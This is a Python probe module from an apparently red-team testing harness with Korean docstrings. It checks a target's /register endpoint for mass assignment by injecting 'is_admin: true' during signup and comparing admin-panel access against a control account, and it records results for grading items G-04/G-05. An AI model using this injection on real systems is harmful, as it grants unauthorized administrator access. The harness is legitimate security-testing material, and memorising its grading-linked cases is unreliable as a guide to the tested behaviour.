"""권한 상승(mass assignment) 시험 프로브 — INV-BFLA (§ GT G-04/G-05).

실제 소스(app.py::register)는 회원가입 요청 바디의 임의 필드를 그대로 저장한다
— is_admin=true 를 주입하면 관리자 계정이 만들어진다. 그리고 관리자 전용
패널(/sup3r_s3cr3t_admin)은 is_admin 인 사용자만 200, 아니면 403 이다.

프로브는 두 계정을 만들어 비교한다:
  - 대조군(정상 가입): 관리자 패널 → 403 이어야 정상
  - 공격군(is_admin=true 주입): 관리자 패널 → 200 이면 권한 상승 성공
이 비교 결과 boolean 만 result.authz_signals 에 담는다(§10). 판정은
oracles/privilege.py::check_bfla 가 한다.
"""
from __future__ import annotations

import secrets

from finredteam.models.finding import CandidateFinding, ExecutionResult
from finredteam.oracles.base import is_success_status

_ADMIN_PANEL = "/sup3r_s3cr3t_admin"


def _register_login_access(session, username: str, password: str, *, inject_admin: bool) -> int:
    """가입(옵션: is_admin 주입) → 로그인 → 관리자 패널 접근. 접근 상태코드 반환."""
    body = {"username": username, "password": password}
    if inject_admin:
        body["is_admin"] = True  # ★ 클라이언트가 통제해선 안 되는 필드 주입
    reg = session._request("POST", "/register", json_body=body)
    if reg.status_code >= 400:
        return reg.status_code
    from finredteam.models.core import Principal

    principal = Principal(id="probe", username=username, password=password)
    principal = session.login(principal)
    ex = session.authed_request("GET", _ADMIN_PANEL, principal)
    return ex.status_code


def run_admin_escalation_probe(session) -> tuple[CandidateFinding, ExecutionResult]:
    """정상 가입 vs is_admin 주입 가입의 관리자 패널 접근을 비교한다."""
    tag = secrets.token_hex(3)
    control_status = _register_login_access(session, f"ctl_{tag}", "Rt!pass123", inject_admin=False)
    attack_status = _register_login_access(session, f"atk_{tag}", "Rt!pass123", inject_admin=True)

    escalated = (not is_success_status(control_status)) and is_success_status(attack_status)

    candidate = CandidateFinding(
        id=f"privesc-{tag}", layer="generic", operation="mass_assignment_privesc",
        principal_id="anon", method="GET", path=_ADMIN_PANEL,
    )
    result = ExecutionResult(
        candidate=candidate,
        status_codes=[attack_status],
        authz_signals={"privilege_escalation_confirmed": escalated},
    )
    return candidate, result


def run_mass_assignment_register_probe(session) -> tuple[CandidateFinding, ExecutionResult]:
    """G-04 — 가입 시점 mass assignment 자체를 /register 지점에 기록한다.
    run_admin_escalation_probe 와 같은 is_admin 주입 확인을 쓰되, Finding 의 endpoint 를
    주입 지점(POST /register)으로 남겨 채점이 G-04(POST /register)와 매칭되게 한다."""
    tag = secrets.token_hex(3)
    control_status = _register_login_access(session, f"ctlr_{tag}", "Rt!pass123", inject_admin=False)
    attack_status = _register_login_access(session, f"atkr_{tag}", "Rt!pass123", inject_admin=True)
    escalated = (not is_success_status(control_status)) and is_success_status(attack_status)
    candidate = CandidateFinding(
        id=f"massassign-{tag}", layer="generic", operation="mass_assignment_register",
        principal_id="anon", method="POST", path="/register",
    )
    result = ExecutionResult(
        candidate=candidate, status_codes=[attack_status],
        authz_signals={"privilege_escalation_confirmed": escalated},
    )
    return candidate, result
